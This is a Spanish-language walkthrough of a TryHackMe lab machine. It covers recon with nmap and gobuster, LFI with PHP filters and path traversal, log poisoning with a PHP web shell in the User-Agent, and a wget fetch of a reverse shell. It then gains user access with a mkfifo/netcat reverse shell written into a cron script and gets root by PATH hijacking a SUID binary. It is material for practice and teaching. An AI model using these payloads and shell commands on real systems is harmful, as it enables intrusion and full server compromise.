Bienvenidos nuevamente a otra sala de TryHackMe. En esta sala enumeraremos los servicios, descubriremos nuevos host y como añadirlos para que nos brinden acceso. Haremos uso de #Burp-Suite , pasaremos su seguridad utilizando #LFI ,con filtros php, para obtener credenciales en el sistema, escalaremos privilegios mediante las actividades cron para acceder al usuario y luego escalar al sistema raiz!

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`  

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-03-27 18:52:23 EDT for 23s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nuestro escaneo nos muestra 2 puertos abierots, con servicios ssh y http. Alojados en distribucion Ubuntu y servidor Apache en sistema operativo Linux.

Seguimos nuestro reconocimiento, buscando posibles pistas que nos pueda brindar la pagina. Si observamos la fuente de pagina o la pagina en si, tendremos una informacion mail de contacto, terminada en "__mafialive.thm__". SI intentamos navegar a este enlance, no nos dara respuesta y quedara cargando. En estos casos, tendremos que agregar el enlance con la IP del servidor para poder acceder con exito. Para ello, utilizaremos `sudo nano /etc/hosts` y pegaremos la IP seguido del enlance al que queremos acceder.

> IPTARGET mafialive.thm

Una vez agregado, podremos acceder al sitio web.

# Enumeration

La enumeracion es clave, y si que es cierto!. Utilizaremos la herramienta __gobuster__ para enumerar directorios ocultos dentro del sitio web. Ejecutaremos `gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/seclists/Discovery/Web-content/Common.txt`

```ruby
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/24 16:30:43 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34] ---> 'directorio oculto'
/server-status        (Status: 403) [Size: 278]
Progress: 4704 / 4714 (99.79%)
===============================================================
2023/04/24 16:32:30 Finished
```

Obtenemos el directorio "/robots.txt", es un archivo de texto que se encuentra en la raíz de un sitio web y que se utiliza para comunicar a los robots de los motores de búsqueda qué partes del sitio web deben ser indexadas o no.

En este caso, al navegar hacie el, podremos ver otro directorio que nos lleva a otro enlance donde hay un boton "/test.php"

# Exploit

Para esta tarea, haremos uso de la vulnerabilidad #LFI (__Local FIle Inclusion__). Con esta vulnerabilidad, podremos abusarnos y enumerar informacion como credenciales, base de datos, archivos de configuracion, entre otros. Siempre que querramos utilizar esta tecnica, es muy recomendable mirar el enlance y que contenga "test.php?view=", asi podremos ejectuar codigo malicioso dentro del enlance.

Utilizaremos filtros php para poder leer la 2da flag de la sala. El filtro que utilizaremos, convertira la respuesta en codigo base64 `pHp://FilTer/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

Para decodificarla utilizamos `echo "RESPUESTA" | base64 -d`.

Podremos ver las credenciales utilizando `http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//etc/passwd`

Ya tendremos un usuario : `archangel`

Ahora que sabemos que es vulnerable a #LFI podremos hacer uso de #LFI2RCE
que se utiliza para aprovechar una vulnerabilidad de inclusión de archivos locales (__LFI__) en una aplicación web y lograr la ejecución remota de código (__RCE__) en el servidor afectado.
 Lo que nos permite lograr la ejecución remota de código en el servidor afectado.

Para inicar nuestro exploit, inciaremos #Burp-Suite e interceptaremos en el siguiente enlace`http://mafialive.thm/test.phpview=/var/www/html/development_testing//..//..//..//..//etc/passwd`
Enviaremos la respuesta al Repeater, modificaremos el agente de usuario y GET, para ejecutar codigo malicioso y transportar nuestra shell. Esta modificacion, nos permitira utilizar la terminal dentro de su sistema, asi podremos transportar nuestro script malicioso y obtener una respuesta en nuestra maquina atacante. Abrimos un servidor python dentro del directorio donde tengamos nuestra __reverse-shell__ : `python3 -m http.server 80` y modificamos nuestro __Burp-Suite__ :

```ruby
GET:/test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd="COMMAND-HERE" HTTP/1.1

USER-AGENT: <?php system($_GET['cmd']); ?>

Resultado final :

GET: /test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=wget%20http://LHOST:80/rev.php HTTP/1.1

USER-AGENT: <?php system($_GET['cmd']); ?>
```

Luego, nos pondremos en escucha `nc -nvlp LPORT` y nos dirigimos donde almacenamos nuestra shell http://mafialive.thm/rev.php

Upgradeamos nuestra terminal `python3 -c 'import pty;pty.spawn("/bin/bash")'`

# Priv. Escalation

Para escalar privilegios, listaremos las actividades cron `cat /etc/crontab`
```ruby
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Nos muestra que el usuario archangel tiene privilegios en un script alojado en /opt llamado "helloworld.sh". Para escalar al usuario archangel, abriremos otra terminal en nuestra maquina atacante y nos pondremos en escucha con un puerto diferente `nc -nvlp 3333`
Luego, suplantaremos el script de archangel por una reverse shell nuestra. Para ello, ejecutaremos un echo y que se sobreescriba el contenido de "helloworld.sh" `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.2.121 3333 >/tmp/f" > helloworld.sh`.

Ahora tan solo esperamos unos minutos y ya tendremos nuestra respuesta con usuario archangel. Nuevamente upgradeamos nuestra terminal `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Para escalar privilegios al sistema raiz, listaremos con __ls__ y podremos ver un directorio nombrado "secret". Luego de cambiar de directorio listaremos nuevamente `ls -lah` que nos mostrara los permisos de cada archivo, en el cual hay un "__backup__" que tiene permisos __root__. 
Para poder abusarnos y escalar al sistema raiz, tendremos que dirigirnos al directorio __/tmp__, luego crearemos una instancia shell en Bash con el indicador "__-p__" que activa el modo privilegiado  __/bin/bash__ utilizando echo, le daremos permisos al archivo para que pueda ejecutarse y luego modificaremos la variable del entorno __$PATH__ para ejecutar el archivo "__backup__" y generar una shell con usuario root!.

Los pasos a seguir :

> `cd secret`--->  Cambiamos directorio /secret
> `ls -la` --->  Listamos permisos
> `./backup` ---> Ejecutamos backup
> `cd /tmp` ---> Cambiamos directorio /tmp
> `echo '/bin/bash -p' > cp` ---> Creamos un archivo "cp" con instancia en /bin/bash privilegiada
> `chmod +x cp` ---> Le daremos permisos de ejecucion
> `ls -la | grep cp` ---> Listamos para corroborar que se creo el archivo
> `export PATH=/tmp:$PATH` ---> Modificamos la varible del entorno a /tmp
> `echo $PATH`  ---> Corroboramos que fue existoso
> `cd home/archangel/secret` ---> Cambiamos de directorio 
> `./backup` ---> Ejecutamos backup
